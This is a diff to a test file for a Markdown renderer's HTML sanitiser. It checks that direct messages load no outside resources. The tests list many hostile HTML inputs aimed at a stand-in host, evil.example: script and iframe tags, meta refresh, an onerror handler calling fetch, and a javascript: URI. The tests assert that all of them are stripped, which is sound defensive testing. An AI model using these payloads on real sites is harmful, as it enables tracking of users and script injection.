@@ -197,26 +197,52 @@ describe('renderMarkdown line breaks', () => {
 })
 
 describe('content that may fetch nothing (a direct message)', () => {
-  const picture = 'data:image/png;base64,AAAA'
-  const other = 'data:image/png;base64,BBBB'
   beforeEach(() => clearMarkdownCache())
 
-  /** Every element of the rendered HTML that names a resource to load. */
+  /** Every attribute of the rendered HTML that could name a resource to load. */
   const sources = (html: string) => {
     const box = document.createElement('div')
     box.innerHTML = html
     return Array.from(box.querySelectorAll('*')).flatMap(el =>
-      ['src', 'srcset', 'poster', 'background', 'style']
+      [
+        'src',
+        'srcset',
+        'poster',
+        'background',
+        'style',
+        'data',
+        'action',
+        'formaction',
+        'ping',
+        'lowsrc',
+        'dynsrc',
+        'xlink:href',
+      ]
         .map(name => el.getAttribute(name))
         .filter((value): value is string => value !== null),
     )
   }
+  const pictures = (html: string) => {
+    const box = document.createElement('div')
+    box.innerHTML = html
+    return Array.from(box.querySelectorAll('img'))
+  }
 
-  it('shows a listed picture where the Markdown has it', () => {
-    const html = renderMarkdown(`a ![cat](${picture}) b`, false, true, [
-      picture,
-    ])
-    expect(html).toContain(`<img alt="cat" src="${picture}">`)
+  it('leaves a placeholder with no source where the Markdown refers to a listed attachment', () => {
+    const html = renderMarkdown('a ![cat](attachment:1) b', false, true, ['1'])
+    expect(html).toContain('<img alt="cat" data-attachment="1">')
+    expect(sources(html)).toEqual([])
+  })
+
+  it('stays the size of the text however often one picture is referenced', () => {
+    const text = Array.from({ length: 1000 }, () => '![p](attachment:1)').join(
+      ' ',
+    )
+    const html = renderMarkdown(text, false, true, ['1'])
+    expect(pictures(html)).toHaveLength(1000)
+    // About 35 characters of HTML per reference; no picture bytes are in it.
+    expect(html.length).toBeLessThan(text.length * 3)
+    expect(html).not.toContain('data:')
   })
 
   it('writes a remote Markdown image as a link and fetches nothing', () => {
@@ -224,22 +250,22 @@ describe('content that may fetch nothing (a direct message)', () => {
       'look ![cat](https://evil.example/t.png?id=1)',
       false,
       true,
-      [picture],
+      ['1'],
     )
     expect(html).not.toContain('<img')
     expect(html).toContain('href="https://evil.example/t.png?id=1"')
     expect(html).toContain('>cat</a>')
   })
 
-  it('writes a data URI that is not a listed picture, or any other scheme, as text', () => {
+  it('writes a data URI, an unlisted attachment or any other scheme as text', () => {
     const html = renderMarkdown(
-      `![a](${other}) ![b](attachment:3) ![c](ipfs://x)`,
+      '![a](data:image/png;base64,AAAA) ![b](attachment:3) ![c](ipfs://x)',
       false,
       true,
-      [picture],
+      ['1'],
     )
     expect(html).not.toContain('<img')
-    expect(html).toContain(`![a](${other})`)
+    expect(html).toContain('![a](data:image/png;base64,AAAA)')
     expect(html).toContain('![b](attachment:3)')
     expect(html).toContain('![c](ipfs://x)')
   })
@@ -252,24 +278,54 @@ describe('content that may fetch nothing (a direct message)', () => {
   it.each([
     '<img src="https://evil.example/t.png">',
     '<img src="//evil.example/t.png">',
-    `<img src="${other}">`,
+    '<img src="http://evil.example/t.png" data-attachment="1">',
+    '<img src="data:image/png;base64,BBBB">',
+    '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
+    '<img src="blob:https://evil.example/1">',
+    '<img src="javascript:alert(1)">',
+    '<img data-attachment="2">',
+    '<img data-attachment="1" srcset="https://evil.example/t.png 2x">',
+    '<img data-attachment="1" style="background:url(https://evil.example/t.png)">',
+    '<img data-attachment="1" onerror="fetch(\'https://evil.example\')">',
+    '<img data-attachment="1" lowsrc="https://evil.example/t.png">',
     '<image src="https://evil.example/t.png">',
-    `<img src="${picture}" srcset="https://evil.example/t.png 2x">`,
     '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>',
     '<audio src="https://evil.example/a.mp3"></audio>',
     '<picture><source srcset="https://evil.example/t.png"><img src="https://evil.example/u.png"></picture>',
     '<input type="image" src="https://evil.example/t.png">',
+    '<form action="https://evil.example/f"><button formaction="https://evil.example/g">x</button></form>',
     '<table background="https://evil.example/t.png"><tr><td>x</td></tr></table>',
     '<div style="background-image: url(https://evil.example/t.png)">x</div>',
     '<style>body { background: url(https://evil.example/t.png) }</style>x',
+    '<link rel="stylesheet" href="https://evil.example/s.css">x',
+    '<link rel="prefetch" href="https://evil.example/p">x',
+    '<meta http-equiv="refresh" content="0;url=https://evil.example/">x',
+    '<base href="https://evil.example/">x',
     '<svg><image href="https://evil.example/t.png" /></svg>',
+    '<svg><use xlink:href="https://evil.example/t.svg#a" /></svg>',
+    '<iframe src="https://evil.example/"></iframe>',
+    '<embed src="https://evil.example/e.swf">',
+    '<object data="https://evil.example/o"></object>',
+    '<script src="https://evil.example/s.js"></script>x',
+    '<div data-attachment="1" src="https://evil.example/t.png">x</div>',
   ])('raw HTML cannot load anything either: %s', raw => {
     for (const html of [
-      renderMarkdown(`hello\n\n${raw}`, false, true, [picture]),
-      purify(raw, [picture]),
+      renderMarkdown(`hello\n\n${raw}`, false, true, ['1']),
+      purify(raw, ['1']),
     ]) {
-      expect(sources(html).filter(value => value !== picture)).toEqual([])
-      expect(html).not.toContain('evil.example')
+      expect(sources(html)).toEqual([])
+      // Only a placeholder for the message's own attachment may remain as a picture.
+      for (const image of pictures(html)) {
+        expect(image.getAttribute('data-attachment')).toBe('1')
+        expect(image.attributes).toHaveLength(image.hasAttribute('alt') ? 2 : 1)
+      }
+      const box = document.createElement('div')
+      box.innerHTML = html
+      expect(
+        box.querySelector(
+          'script,iframe,embed,object,link,meta,base,style,svg,video,audio,form,input',
+        ),
+      ).toBeNull()
     }
   })
 
